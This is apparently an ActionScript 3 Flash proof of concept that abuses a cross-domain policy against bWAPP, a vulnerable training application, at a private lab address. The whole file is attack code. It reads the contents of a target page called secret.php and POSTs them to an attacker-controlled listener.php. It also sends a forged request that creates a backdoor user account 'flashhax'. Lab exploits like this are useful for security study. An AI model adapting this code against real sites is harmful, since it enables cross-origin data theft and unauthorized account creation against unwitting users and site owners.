// Writen by John M
// twitter.com/x41x41x41, medium.com/@x41x41x41
// REF: https://help.adobe.com/en_US/as3/dev/WS5b3ccc516d4fbf351e63e3d118a9b90204-7cfd.html#WS5b3ccc516d4fbf351e63e3d118666ade46-7cb2
package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLVariables;
 import flash.net.URLLoader;
 import flash.net.URLLoaderDataFormat;

 public class crossDomain extends Sprite {
  public function crossDomain() {
   // grab DOM from target page
   var firstrequest:URLRequest = new URLRequest("http://192.168.1.232/bWAPP/secret.php?d=b");
   var firstloader:URLLoader = new URLLoader();
   firstloader.addEventListener(Event.COMPLETE, completeHandler);
   try {
    firstloader.load(firstrequest);
   } catch (error: Error) {
    trace("Unable to load URL: " + error);
   }

   // Now lets do a POST request
   // This one will create a new user with the creds flashhax/flashhax
   var secondvariables:URLVariables = new URLVariables("login=flashhax&email=flashhax%40AAAA.COM&password=flashhax&password_conf=flashhax&secret=flashhax&action=create");
   var secondrequest:URLRequest = new URLRequest("http://192.168.1.232/bWAPP/user_extra.php");
   secondrequest.method = URLRequestMethod.POST;
   secondrequest.data = secondvariables;
   var secondloader:URLLoader = new URLLoader();
   secondloader.dataFormat = URLLoaderDataFormat.VARIABLES;
   try {
    secondloader.load(secondrequest);
   } catch (error: Error) {
    trace("Unable to load URL");
   }

  }

  private function completeHandler(event: Event): void {

   // Send data to a place where we can listen for it
   // typically the same webserver that served the flash file
   var request:URLRequest = new URLRequest("/listener.php");
   var variables:URLVariables = new URLVariables();
   variables.data = event.target.data;
   request.method = URLRequestMethod.POST;
   request.data = variables;
   var loader:URLLoader = new URLLoader();
   try {
    loader.load(request);
   } catch (error: Error) {
    trace("Unable to load URL");
   }
  }
 }
}
